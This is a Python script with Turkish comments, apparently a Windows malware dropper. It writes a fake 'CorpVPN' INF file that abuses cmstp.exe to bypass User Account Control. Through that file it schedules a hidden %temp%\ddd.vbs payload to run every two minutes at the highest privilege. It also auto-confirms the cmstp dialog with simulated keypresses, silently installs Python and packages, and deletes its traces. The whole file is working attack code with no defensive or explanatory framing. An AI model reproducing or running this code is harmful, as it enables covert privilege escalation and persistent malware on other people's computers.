import os
import subprocess
import time
import sys
import ctypes
try:
    import psutil
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil'])
    import psutil

user32 = ctypes.windll.user32

WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_RETURN = 0x0D

def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = result.stdout.decode(errors='replace')
    stderr = result.stderr.decode(errors='replace')
    return result.returncode, stdout, stderr

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands to run before setup begins
taskkill /IM cmstp.exe /F
cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST

[CustInstDestSectionAllUsers]
49000,49001=AllUser_LDIDSection,7

[AllUser_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"""
    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content)
    return inf_file_path

def find_window_handle_by_process_name(proc_name):
    hwnds = []

    def enum_windows_proc(hwnd, lParam):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        try:
            proc = psutil.Process(pid.value)
            if proc.name().lower() == proc_name.lower():
                if user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
        except Exception:
            pass
        return True

    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)

    if hwnds:
        return hwnds[0]
    return None

def send_enter_via_postmessage(hwnd):
    user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
    time.sleep(0.05)
    user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)

def main():
    # Eski görevleri temizle
    run_command('schtasks /delete /tn "InstallRequests" /f')
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

    # Python kontrolü
    returncode, _, _ = run_command("python --version")
    if returncode != 0:
        # Python yoksa yükle
        returncode, _, _ = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
        if returncode != 0:
            sys.exit(1)

    # install_requests.py oluştur
    temp_dir = os.getenv('TEMP')
    script_path = os.path.join(temp_dir, 'install_requests.py')
    with open(script_path, 'w') as script_file:
        script_file.write("import subprocess\n")
        script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")

    # Görev oluştur
    returncode, _, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
    if returncode != 0:
        print(f"Failed to create task 'InstallRequests': {stderr}")
        sys.exit(1)

    run_command('schtasks /run /tn "InstallRequests"')

    time.sleep(10)
    os.remove(script_path)

    # INF dosyası oluştur
    inf_file_path = create_inf_file()

    # cmstp.exe'yi INF dosyasıyla başlat
    cmd = f'cmstp.exe /au "{inf_file_path}"'
    subprocess.Popen(cmd, shell=True)

    # cmstp.exe penceresi açılana kadar bekle (max 15 saniye)
    hwnd = None
    for _ in range(15):
        hwnd = find_window_handle_by_process_name('cmstp.exe')
        if hwnd:
            break
        time.sleep(1)

    if not hwnd:
        print("cmstp.exe penceresi bulunamadı.")
        sys.exit(1)

    print(f"cmstp.exe penceresi bulundu: {hwnd}")

    # ENTER tuşunu doğrudan pencereye gönder
    send_enter_via_postmessage(hwnd)
    print("ENTER tuşu gönderildi.")

if __name__ == "__main__":
    main()
